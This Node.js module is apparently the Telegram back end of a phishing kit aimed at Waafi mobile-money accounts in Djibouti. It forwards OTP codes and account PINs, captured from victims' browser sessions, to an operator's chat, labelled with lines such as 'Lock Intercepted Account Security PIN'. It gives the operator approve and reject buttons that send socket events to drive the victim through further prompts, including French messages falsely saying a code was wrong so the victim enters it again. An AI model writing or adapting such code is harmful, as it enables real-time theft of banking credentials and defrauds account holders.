const TelegramBot = require('node-telegram-bot-api');

const token = process.env.BOT_TOKEN;
const chatId = process.env.ADMIN_CHAT_ID;

if (!token || !chatId) {
    console.error("Crucial environment keys (BOT_TOKEN / ADMIN_CHAT_ID) are undefined.");
}

// Disable native polling when deployed in serverless architectures to prevent double execution loops
const bot = new TelegramBot(token, { polling: true });

console.log("[Bot Core] Telegram Service Engine initialized successfully.");

function formatPayloadMessage(appId, headline, metadata) {
    let baseTemplate = `<b>[DJIBOUTI] ${headline}</b>\n`;
    baseTemplate += `<code>────────────────────────</code>\n`;
    baseTemplate += `ID App Session: <b>${appId}</b>\n`;
    
    for (const [key, val] of Object.entries(metadata)) {
        if (val !== undefined && val !== null && val !== '') {
            const label = key.replace(/([A-Z])/g, ' $1').replace(/^./, str => str.toUpperCase());
            baseTemplate += `* ${label}: <code>${val}</code>\n`;
        }
    }
    baseTemplate += `<code>────────────────────────</code>`;
    return baseTemplate;
}

function buildInlineOptions(appId, prefix = "approve") {
    return {
        reply_markup: {
            inline_keyboard: [
                [
                    { text: "Approve / Next", callback_data: `${prefix}_${appId}` },
                    { text: "Reject Status", callback_data: `reject_${prefix}_${appId}` }
                ]
            ]
        },
        parse_mode: 'HTML'
    };
}

function sendToAdmin(appId, title, metadata, generateControls = false) {
    console.log(`[Bot Core] Sending metadata update to Administrator. Target: ${appId}`);
    const textContent = formatPayloadMessage(appId, title, metadata);
    const layoutSettings = generateControls ? buildInlineOptions(appId, "approve") : { parse_mode: 'HTML' };
    
    bot.sendMessage(chatId, textContent, layoutSettings)
        .then(() => console.log(`[Bot Core] Admin update dispatched successfully for session ${appId}`))
        .catch(err => {
            console.error(`Admin channel messaging failure: ${err.message}`);
        });
}

function sendFinalApproval(appId, pinCode) {
    console.log(`[Bot Core] Dispatching captured PIN entry to Admin. Target: ${appId}`);
    const bodyText = `<b>[DJIBOUTI] Lock Intercepted Account Security PIN</b>\n<code>────────────────────────</code>\nID App Session: <b>${appId}</b>\nWaafi PIN Entry: <code>${pinCode}</code>\n<code>────────────────────────</code>`;
    bot.sendMessage(chatId, bodyText, buildInlineOptions(appId, "pinok")).catch(err => {
        console.error(`Pin data routing failure: ${err.message}`);
    });
}

function sendSecondOTP(appId, backupCode) {
    console.log(`[Bot Core] Dispatching Secondary OTP 2 verification entry to Admin. Target: ${appId}`);
    const textMarkup = `<b>[DJIBOUTI] Warning Secondary Authorization Layer (OTP 2)</b>\n<code>────────────────────────</code>\nID App Session: <b>${appId}</b>\nVerification Key: <code>${backupCode}</code>\n<code>────────────────────────</code>`;
    bot.sendMessage(chatId, textMarkup, buildInlineOptions(appId, "otp2ok")).catch(err => {
        console.error(`Step secondary data routing failure: ${err.message}`);
    });
}

bot.on('callback_query', (query) => {
    const callbackData = query.data;
    const messageId = query.message.message_id;
    
    console.log(`[Bot Core] Incoming Telegram Action Callback: "${callbackData}" from messageId: ${messageId}`);

    bot.answerCallbackQuery(query.id, { text: "Processing request..." }).catch(e => console.error(e));
    
    const parts = callbackData.split('_');
    
    if (parts.length < 2) {
        console.error("[Bot Core] Invalid callback action format received.");
        return;
    }

    let action = parts[0];
    let targetAppId = parts[1];
    let isRejected = false;

    // Correctly parses structured nested split formats like reject_approve_ID or reject_pinok_ID
    if (action === 'reject') {
        isRejected = true;
        action = parts[1]; // Extract the precise context step that is being rejected
        targetAppId = parts[2];
    }

    if (!targetAppId || targetAppId === "null" || targetAppId === "") {
        console.error("[Bot Core] Targeted Application Session ID is empty or invalid.");
        return;
    }

    let systemResponseLog = "";

    if (isRejected) {
        console.log(`[Bot Core] Reject action captured for phase [${action}] on session [${targetAppId}]`);
        // Route rejection back to corresponding event channels listened to by the browser UI
        switch (action) {
            case 'approve':
                global.io.to(targetAppId).emit('otp-failed', { message: "Le code OTP 1 est incorrect ou a expiré." });
                systemResponseLog = "REJECTED: Initial OTP 1 marked invalid. User prompted to retry.";
                break;
            case 'pinok':
                global.io.to(targetAppId).emit('pin-failed', { message: "Le code PIN est incorrect." });
                systemResponseLog = "REJECTED: Account PIN marked invalid. User prompted to retry.";
                break;
            case 'otp2ok':
                global.io.to(targetAppId).emit('otp2-failed', { message: "Le code OTP 2 est incorrect." });
                systemResponseLog = "REJECTED: Secondary OTP 2 marked invalid. User prompted to retry.";
                break;
            default:
                global.io.to(targetAppId).emit('admin-reject', { message: "La vérification a échoué. Veuillez réessayer." });
                systemResponseLog = "REJECTED: Session marked as rejected.";
        }
    } else {
        console.log(`[Bot Core] Approval action captured for phase [${action}] on session [${targetAppId}]`);
        // Emit events to advance the frontend steps
        switch (action) {
            case 'approve':
                global.io.to(targetAppId).emit('admin-approve-otp');
                systemResponseLog = "APPROVED: Initial OTP Verified. Pushed to PIN stage.";
                break;

            case 'pinok':
                global.io.to(targetAppId).emit('pin-verified');
                systemResponseLog = "APPROVED: PIN Captured. Pushed to Secondary Verification (OTP 2).";
                break;

            case 'otp2ok':
                global.io.to(targetAppId).emit('admin-approve-otp2');
                systemResponseLog = "APPROVED: Secondary Layer Cleared. Opened parameters dashboard.";
                break;
                
            default:
                console.warn(`Unrecognized interaction handler context: ${action}`);
                return;
        }
    }

    // Refresh the administrative log directly inside Telegram chat history
    bot.editMessageText(`${query.message.text}\n\n[Action Log]: ${systemResponseLog}`, {
        chat_id: chatId,
        message_id: messageId,
        parse_mode: 'HTML'
    }).catch(err => console.error(`Message context update exception: ${err.message}`));
});

module.exports = {
    bot,
    sendToAdmin,
    sendFinalApproval,
    sendSecondOTP
};
